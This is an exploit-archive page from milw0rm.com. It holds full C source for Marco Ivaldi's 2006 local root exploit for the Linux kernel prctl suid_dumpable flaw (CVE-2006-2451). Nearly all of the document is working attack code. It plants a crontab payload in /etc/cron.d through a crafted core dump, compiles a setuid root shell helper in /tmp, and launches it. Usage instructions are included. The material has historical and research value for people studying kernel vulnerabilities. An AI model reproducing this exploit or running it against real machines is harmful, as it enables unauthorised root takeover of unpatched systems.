<html><head><title>Linux Kernel 2.6.13 <= 2.6.17.4 sys_prctl() Local Root Exploit (3)</title></head><pre>/*
 * $Id: raptor_prctl.c,v 1.1 2006/07/13 14:21:43 raptor Exp $
 *
 * raptor_prctl.c - Linux 2.6.x suid_dumpable vulnerability
 * Copyright (c) 2006 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;
 *
 * The suid_dumpable support in Linux kernel 2.6.13 up to versions before 
 * 2.6.17.4, and 2.6.16 before 2.6.16.24, allows a local user to cause a denial 
 * of service (disk consumption) and POSSIBILY (yeah, sure;) gain privileges 
 * via the PR_SET_DUMPABLE argument of the prctl function and a program that 
 * causes a core dump file to be created in a directory for which the user does 
 * not have permissions (CVE-2006-2451).
 *
 * Berlin, Sunday July 9th 2006: CAMPIONI DEL MONDO! CAMPIONI DEL MONDO!
 * CAMPIONI DEL MONDO! (i was tempted to name this exploit &quot;pajolo.c&quot;;))
 *
 * Greets to Paul Starzetz and Roman Medina, who also exploited this ugly bug.
 *
 * NOTE. This exploit uses the Vixie's crontab /etc/cron.d attack vector: this
 * means that distributions that use a different configuration (namely Dillon's
 * crontab on Slackware Linux) can be vulnerable but not directly exploitable.
 *
 * Usage:
 * $ gcc raptor_prctl.c -o raptor_prctl -Wall
 * [exploit must be dinamically linked]
 * $ ./raptor_prctl
 * [...]
 * sh-3.00#
 *
 * Vulnerable platforms:
 * Linux from 2.6.13 up to 2.6.17.4 [tested on SuSE Linux 2.6.13-15.8-default]
 */

#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;signal.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/resource.h&gt;
#include &lt;sys/prctl.h&gt;

#define INFO1	&quot;raptor_prctl.c - Linux 2.6.x suid_dumpable vulnerability&quot;
#define	INFO2	&quot;Copyright (c) 2006 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;&quot;

char payload[] = /* commands to be executed by privileged crond */
&quot;\nSHELL=/bin/sh\nPATH=/usr/bin:/usr/sbin:/sbin:/bin\n* * * * *   root   chown root /tmp/pwned; chmod 4755 /tmp/pwned; rm -f /etc/cron.d/core\n&quot;;

char pwnage[] = /* build setuid() helper to circumvent bash checks */
&quot;echo \&quot;main(){setuid(0);setgid(0);system(\\\&quot;/bin/sh\\\&quot;);}\&quot; &gt; /tmp/pwned.c; gcc /tmp/pwned.c -o /tmp/pwned &amp;&gt;/dev/null; rm -f /tmp/pwned.c&quot;;

int main(void)
{
	int 		pid, i;
	struct rlimit 	corelimit;
	struct stat	st;

	/* print exploit information */
	fprintf(stderr, &quot;%s\n%s\n\n&quot;, INFO1, INFO2);

	/* prepare the setuid() helper */
	system(pwnage);

	/* set core size to unlimited */
	corelimit.rlim_cur = RLIM_INFINITY;
	corelimit.rlim_max = RLIM_INFINITY;
	setrlimit(RLIMIT_CORE, &amp;corelimit);

	/* let's do the PR_SET_DUMPABLE magic */
	if (!(pid = fork())) {
		chdir(&quot;/etc/cron.d&quot;);
		prctl(PR_SET_DUMPABLE, 2);
		sleep(666);
		exit(1);
	}
	kill(pid, SIGSEGV);

	/* did it work? */
	sleep(3);
	if (stat(&quot;/etc/cron.d/core&quot;, &amp;st) &lt; 0) {
		fprintf(stderr, &quot;Error: Not vulnerable? See comments.\n&quot;);
		exit(1);
	}

	fprintf(stderr, &quot;Ready to uncork the champagne? &quot;);
	fprintf(stderr, &quot;Please wait a couple of minutes;)\n&quot;);

	/* wait for crond to execute our evil entry */
	for (i = 0; i &lt; 124; i += 2) {
		if (stat(&quot;/tmp/pwned&quot;, &amp;st) &lt; 0) {
			fprintf(stderr, &quot;\nError: Check /tmp/pwned!\n&quot;);
			exit(1);
		}
		if (st.st_uid == 0)	
			break;
		fprintf(stderr, &quot;.&quot;);
		sleep(2);
	}

	/* timeout reached? */
	if (i &gt; 120) {
		fprintf(stderr, &quot;\nTimeout: Check /tmp/pwned!\n&quot;);
		exit(1);
	}

	/* total pwnage */
	fprintf(stderr, &quot;CAMPIONI DEL MONDO!\n\n&quot;);
	system(&quot;/tmp/pwned&quot;);
	exit(0);
}

// milw0rm.com [2006-07-13]</pre></html>